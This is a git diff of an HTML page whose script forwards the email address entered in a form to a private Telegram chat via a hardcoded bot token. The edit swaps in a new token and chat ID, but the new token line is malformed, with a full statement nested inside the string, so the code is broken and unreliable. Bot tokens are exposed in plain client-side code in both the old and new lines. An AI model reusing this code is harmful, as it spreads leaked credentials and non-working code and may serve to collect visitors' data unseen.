@@ -13,8 +13,8 @@
     async function sendEmailToTelegram(event) {
       event.preventDefault();
       const email = document.getElementById('email').value;
-      const botToken = '7683535358:AAFmqpo4E2a2_IBQE0weLkmKZKCnXBxlZPE'; // <-- Insert your bot token here
-      const chatId = '@cjcjndskndmsmdn';     // <-- Insert your chat ID here
+      const botToken = 'const botToken = '8304941656:AAHhpAsBajpDXiUvwxuNdZMWrqQrKnOssIA'; // <-- Insert your bot token here'; // <-- Insert your bot token here
+      const chatId = '@huseyn777777';     // <-- Insert your chat ID here
       const message = `Email address: ${email}`;
       
       const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
@@ -91,4 +91,5 @@
     </div>
   </div>
 </body>
+
 </html>
